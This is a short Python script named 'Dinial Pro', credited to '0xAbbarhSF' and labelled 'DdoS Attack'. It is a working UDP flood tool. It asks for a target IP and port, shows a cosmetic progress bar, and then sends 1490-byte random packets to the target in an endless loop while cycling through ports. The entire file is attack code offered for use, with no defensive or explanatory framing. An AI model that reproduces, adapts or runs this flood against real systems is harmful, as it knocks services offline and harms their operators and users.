#!/usr/bin/env python3

import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("Dinial Pro")
print("========================")
print(" Coded by: 0xAbbarhSF ")
print("   GitHub: 0xAbbarhSF ")
print("  Twitter: 0xAbbarhSF ")
print("========================")
print()

ip = input("IP Target: ")
port = int(input("Port: "))
os.system("clear")
print()
print("DdoS Attack")
print("Author: 0xAbbarhSF")
print()

print("Working...")
time.sleep(5)

print("[                    ] 0%")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print("Sent %s packet to %s through port: %s" % (sent, ip, port))
    if port == 65534:
        port = 1

